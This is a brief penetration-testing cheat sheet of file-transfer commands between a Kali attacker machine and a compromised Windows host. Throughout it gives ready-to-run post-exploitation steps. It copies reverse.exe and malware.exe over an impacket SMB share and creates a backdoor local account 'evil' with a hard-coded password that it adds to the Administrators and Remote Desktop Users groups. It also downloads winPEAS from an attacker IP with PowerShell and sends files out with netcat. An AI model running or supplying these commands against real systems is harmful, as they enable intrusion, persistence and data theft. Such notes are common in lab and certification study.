## SMB SERVER  
Note1: Use -smb2support if normal way didnt work 
Note2: This might work for Linux too

## Kali to Windows Shell
```
impacket-smbserver kali . (starting smb server in kali)

copy \\ip\kali\reverse.exe C:\PrivEsc\reverse.exe (copying file from kali to windows shell)
```
## Windows Shell to Kali
```
impacket-smbserver kali . (starting smb server in kali)

copy .\malware.exe \\ip\sharename\malware.exe (copying file from windows shell to kali)
```
## Authenticated Transfer (Need local admin rights or local admin creds)
```
net user evil /add japan (japan is pass)
   
net localgroup "Administrators" /add evil

net localgroup "Remote Desktop Users" /add evil

sudo impacket-smbserver kali . -smb2support -username evil -password japan (kali)
```
## PowerShell
```
iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
```
## Netcat:
```
nc kaliip port < file
nc -lvnp port > file
```
